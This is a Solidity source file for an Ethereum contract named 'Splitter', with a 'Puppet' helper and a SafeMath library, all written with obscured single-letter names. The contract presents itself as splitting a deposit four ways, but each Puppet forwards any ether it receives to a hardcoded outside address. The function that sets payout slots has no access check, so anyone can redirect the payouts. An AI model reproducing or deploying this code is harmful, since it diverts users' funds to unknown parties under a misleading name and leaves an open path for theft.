pragma solidity ^0.4.23;

contract Splitter{

	address public m;
	address[] public h;
	mapping (uint256 => address) public n;
	address private o;
	uint256 private j;
	uint256 private k;


	constructor() payable public{
		m = msg.sender;
		e();
		e();
		e();
		e();
		n[0] = h[0];
        n[1] = h[1];
        n[2] = h[2];
        n[3] = h[3];
	}


	function f() public{
		require(msg.sender == m);
		m.transfer(address(this).balance);
	}


	function a() public constant returns(uint256 b){
    	return h.length;
  	}


	function e() public returns(address e){
	    require(msg.sender == m);
    	Puppet p = new Puppet();
    	h.push(p);
    	return p;
  		}


    function g(uint256 q, address d) public {
        require(d != address(0));
        n[q] = d;
    }


    function c() public payable {
        require(msg.sender == m);
    	j = SafeMath.t(msg.value, 4);
        n[0].call.value(j).gas(800000)();
        n[1].call.value(j).gas(800000)();
        n[2].call.value(j).gas(800000)();
        n[3].call.value(j).gas(800000)();
        }


function() payable public{
	}
}

contract Puppet {

    mapping (uint256 => address) public l;
    mapping (uint256 => address) public i;

	constructor() payable public{

		l[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;
        i[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;
	}


	function() public payable{
	    if(msg.sender != l[0]){
			l[0].call.value(msg.value).gas(600000)();
		}
    }


	function f() public{
		require(msg.sender == i[0]);
		i[0].transfer(address(this).balance);
	}
}


library SafeMath {

  function p(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function t(uint256 a, uint256 b) internal pure returns (uint256) {
    return a / b;
  }

  function r(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function s(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}